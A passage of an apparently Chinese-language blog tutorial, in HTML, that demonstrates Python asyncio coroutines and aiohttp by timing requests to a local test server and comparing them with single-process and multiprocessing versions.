class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line">start = time.time()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">Request</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://127.0.0.1:5000'</span></span><br><span class="line">    print(<span class="string">'Waiting for'</span>,url)</span><br><span class="line">    response = requests.get(url)</span><br><span class="line">    print(<span class="string">'Get response from '</span>, url, <span class="string">'Result: '</span>, response.text)</span><br><span class="line"> </span><br><span class="line">tasks = [asyncio.ensure_future(Request()) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">5</span>)]</span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(asyncio.wait(tasks))</span><br><span class="line"> </span><br><span class="line">end = time.time()</span><br><span class="line">print(<span class="string">'Cost time:'</span>,end - start)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#运行结果：</span></span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Get response <span class="keyword">from</span>  http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result:  Hello!</span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Get response <span class="keyword">from</span>  http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result:  Hello!</span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Get response <span class="keyword">from</span>  http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result:  Hello!</span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Get response <span class="keyword">from</span>  http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result:  Hello!</span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Get response <span class="keyword">from</span>  http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result:  Hello!</span><br><span class="line">Cost time: <span class="number">15.040287971496582</span></span><br></pre></td></tr></table></figure></li><li><p>通过协程的方式请求页面发现还是在依次执行，时间为15s，效率并没有提高，原因是：协程提高效率的最大 特点是异步协程，重点是要能够异步请求，就需要程序可以将阻塞的协程挂起，让出控制权，执行其他协程。在python3.5及以后通过await实现挂起的操作，当loop循环事件遇到await是就执行协程挂起。</p></li><li><p>根据第三点的提出的特点，我们要实现挂起的是请求页面的操作，所以这里将请求页面的方法做一个修改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line">start = time.time()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">Request</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://127.0.0.1:5000'</span></span><br><span class="line">    print(<span class="string">'Waiting for'</span>,url)</span><br><span class="line">    response = <span class="keyword">await</span> requests.get(url)</span><br><span class="line">    print(<span class="string">'Get response from '</span>, url, <span class="string">'Result: '</span>, response.text)</span><br><span class="line"> </span><br><span class="line">tasks = [asyncio.ensure_future(Request()) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">5</span>)]</span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(asyncio.wait(tasks))</span><br><span class="line"> </span><br><span class="line">end = time.time()</span><br><span class="line">print(<span class="string">'Cost time:'</span>,end - start)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#运行结果：</span></span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Cost time: <span class="number">15.033875942230225</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"D:/python/实战项目/Coroutine8.py"</span>, line <span class="number">10</span>, <span class="keyword">in</span> Request</span><br><span class="line">    response = <span class="keyword">await</span> requests.get(url)</span><br><span class="line">TypeError: object Response can<span class="string">'t be used in '</span><span class="keyword">await</span><span class="string">' expression</span></span><br></pre></td></tr></table></figure></li><li><p>通过运行结果来看，不能这样修改，Waiting for http这里确实是挂起了，但是await后面的对象不对，因为await后面必须跟一个原生 coroutine 对象或者一个由 types.coroutine() 修饰的生成器，这个生成器可以返回 coroutine 对象，而requests.get的生成的对象是：<class 'requests.models.response'>，所以不符合</class></p></li><li><p>所以考虑将请求页面的方法单独封装，实现生成coroutine 对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line">start = time.time()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> requests.get(url)</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">Request</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://127.0.0.1:5000'</span></span><br><span class="line">    print(<span class="string">'Waiting for'</span>,url)</span><br><span class="line">    response = <span class="keyword">await</span> get(url)</span><br><span class="line">    print(<span class="string">'Get response from '</span>, url, <span class="string">'Result: '</span>, response.text)</span><br><span class="line"> </span><br><span class="line">tasks = [asyncio.ensure_future(Request()) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">5</span>)]</span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(asyncio.wait(tasks))</span><br><span class="line"> </span><br><span class="line">end = time.time()</span><br><span class="line">print(<span class="string">'Cost time:'</span>,end - start)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#运行结果：</span></span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Get response <span class="keyword">from</span>  http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result:  Hello!</span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Get response <span class="keyword">from</span>  http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result:  Hello!</span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Get response <span class="keyword">from</span>  http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result:  Hello!</span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Get response <span class="keyword">from</span>  http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result:  Hello!</span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Get response <span class="keyword">from</span>  http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result:  Hello!</span><br><span class="line">Cost time: <span class="number">15.035670042037964</span></span><br></pre></td></tr></table></figure></li><li><p>通过运行结果来看，将I/O操作的代码封装到 async 修饰的方法里面是不可行，无法实现异步请求，所以必须使用支持异步请求的方法来实现，这里使用<strong>aiohttp</strong>(时间缩短为原来的1/5，效率大大提高)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#不要为每次的连接都创建一次session,一般情况下只需要创建一个session，然后使用这个session执行所有的请求。</span></span><br><span class="line"><span class="comment">#每个session对象，内部包含了一个连接池，并且将会保持连接和连接复用（默认开启）可以加快整体的性能。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> aiohttp</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line">start = time.time()</span><br><span class="line"> <span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(url)</span>:</span></span><br><span class="line">       session = aiohttp.ClientSession()</span><br><span class="line">       response = <span class="keyword">await</span> session.get(url)</span><br><span class="line">       result = <span class="keyword">await</span> response.text()</span><br><span class="line">       <span class="keyword">await</span> session.close()           </span><br><span class="line">       <span class="comment">#这里的await是必须的，因为session的请求会话出现了可挂起的选项，如果close不可以挂起，会出现阻塞的状态导致报错</span></span><br><span class="line">       <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">   <span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">request</span><span class="params">()</span>:</span></span><br><span class="line">       url = <span class="string">'http://127.0.0.1:5000'</span></span><br><span class="line">       print(<span class="string">'Waiting for'</span>,url)</span><br><span class="line">       result = <span class="keyword">await</span> get(url)</span><br><span class="line">       print(<span class="string">'Get response from'</span>,url,<span class="string">'Result:'</span>,result)</span><br><span class="line"></span><br><span class="line">   tasks = [asyncio.ensure_future(request()) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">5</span>)]</span><br><span class="line">   loop = asyncio.get_event_loop()</span><br><span class="line">   loop.run_until_complete(asyncio.wait(tasks))</span><br><span class="line"></span><br><span class="line">   end = time.time()</span><br><span class="line">   print(<span class="string">'Cost time:'</span>,end - start)</span><br><span class="line"><span class="comment"># 运行结果：</span></span><br><span class="line"></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Cost time: <span class="number">3.0310966968536377</span></span><br><span class="line"><span class="comment"># 修改await session.close()为session.close()的报错执行结果</span></span><br><span class="line"></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Cost time: <span class="number">3.012549638748169</span></span><br><span class="line">   D:/python/Conoutine10.py:<span class="number">12</span>: RuntimeWarning: coroutine <span class="string">'ClientSession.close'</span> was never        session.close()</span><br><span class="line">   Unclosed client session</span><br><span class="line">   client_session: &lt;aiohttp.client.ClientSession object at <span class="number">0x0000022C36EC9D68</span>&gt;</span><br><span class="line">   Unclosed client session</span><br><span class="line">   client_session: &lt;aiohttp.client.ClientSession object at <span class="number">0x0000022C36EC9EF0</span>&gt;</span><br><span class="line">   Unclosed client session</span><br><span class="line">   client_session: &lt;aiohttp.client.ClientSession object at <span class="number">0x0000022C36EC9F28</span>&gt;</span><br><span class="line">   Unclosed client session</span><br><span class="line">   client_session: &lt;aiohttp.client.ClientSession object at <span class="number">0x0000022C36EC9F98</span>&gt;</span><br><span class="line">   Unclosed client session</span><br><span class="line">   client_session: &lt;aiohttp.client.ClientSession object at <span class="number">0x0000022C36EC9F60</span>&gt;</span><br></pre></td></tr></table></figure></li><li><p>通过几次代码的修改，我们成功的实现了真正的异步协程。开始运行时，时间循环会运行第一个 task，针对第一个 task 来说，当执行到第一个 await 跟着的 get() 方法时，它被挂起，但这个 get() 方法第一步的执行是非阻塞的，挂起之后立马被唤醒，所以立即又进入执行，创建了 ClientSession 对象，接着遇到了第二个 await，调用了 session.get() 请求方法，然后就被挂起了，由于请求需要耗时很久，所以一直没有被唤醒，好第一个 task 被挂起了，那接下来该怎么办呢？事件循环会寻找当前未被挂起的协程继续执行，于是就转而执行第二个 task 了，也是一样的流程操作，直到执行了第五个 task 的 session.get() 方法之后，全部的 task 都被挂起了。所有 task 都已经处于挂起状态，那咋办？只好等待了。3 秒之后，几个请求几乎同时都有了响应，然后几个 task 也被唤醒接着执行，输出请求结果，最后耗时，3 秒！这里对应这我们模拟服务端设置的延时3秒。</p></li><li><p>根据上面显示的结果来看，5个task在3s之内都是挂起的等待的，同理，在3s之内CPU处理的task数量肯定会比5个（取决于CPU，我这里改成1000就会报错）；所以就意味着在CPU允许的范围之内处理多少task的时间都是3s（前提是服务段抗压性好，能正确对每次请求做出正确的返回）。将5改为300来测试：task数量提高了60倍，处理时间还是3s，可以看到协程的优点；多出来的部分时间是IO 传输时延</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> aiohttp</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">start = time.time()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(url)</span>:</span></span><br><span class="line">    session = aiohttp.ClientSession()</span><br><span class="line">    response = <span class="keyword">await</span> session.get(url)</span><br><span class="line">    result = <span class="keyword">await</span> response.text()</span><br><span class="line">    <span class="keyword">await</span>  session.close()</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">request</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://127.0.0.1:5000'</span></span><br><span class="line">    print(<span class="string">'Waiting for'</span>,url)</span><br><span class="line">    result = <span class="keyword">await</span> get(url)</span><br><span class="line">    print(<span class="string">'Get response from'</span>,url,<span class="string">'Result:'</span>,result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tasks = [asyncio.ensure_future(request()) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">300</span>)]</span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(asyncio.wait(tasks))</span><br><span class="line"></span><br><span class="line">end = time.time()</span><br><span class="line">print(<span class="string">'Cost time:'</span>,end - start)</span><br></pre></td></tr></table></figure></li></ol><h3 id="与单进程、多进程、多线程的对比"><a href="#与单进程、多进程、多线程的对比" class="headerlink" title="与单进程、多进程、多线程的对比"></a>与单进程、多进程、多线程的对比</h3><ol><li><p>单进程，单线程：(以10次请求为例)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line">start = time.time()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Request</span><span class="params">()</span>:</span></span><br><span class="line">url = <span class="string">'http://127.0.0.1:5000'</span></span><br><span class="line">    print(<span class="string">'Waiting for'</span>,url)</span><br><span class="line">    result = requests.get(url).text</span><br><span class="line">    print(<span class="string">'Get response from'</span>,url,<span class="string">'Result:'</span>,result)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    Request()</span><br><span class="line">end = time.time()</span><br><span class="line">print(<span class="string">'Cost time:'</span>,end - start)</span><br><span class="line"><span class="comment"># 运行结果：</span></span><br><span class="line"></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Cost time: <span class="number">30.057233095169067</span></span><br></pre></td></tr></table></figure></li><li><p>多进程(以10次请求为例)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">   <span class="keyword">import</span> time</span><br><span class="line">   <span class="keyword">import</span> multiprocessing</span><br><span class="line"> </span><br><span class="line">   start = time.time()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">Request</span><span class="params">(_)</span>:</span></span><br><span class="line">       url = <span class="string">'http://127.0.0.1:5000'</span></span><br><span class="line">       print(<span class="string">'Waiting for'</span>,url)</span><br><span class="line">       result = requests.get(url).text</span><br><span class="line">       print(<span class="string">'Get response from'</span>,url,<span class="string">'Result:'</span>,result)</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">       cpu_count = multiprocessing.cpu_count()    <span class="comment">#cpu数目</span></span><br><span class="line">       print(<span class="string">'Cpu count:'</span>,cpu_count)</span><br><span class="line">       pool = multiprocessing.Pool(cpu_count)</span><br><span class="line">       pool.map(Request,range(<span class="number">10</span>))</span><br><span class="line">       end = time.time()</span><br><span class="line">       print(<span class="string">'Cost time:'</span>,end - start)</span><br><span class="line"> </span><br><span class="line">   <span class="comment">#运行结果：</span></span><br><span class="line">   Cpu count: <span class="number">4</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span 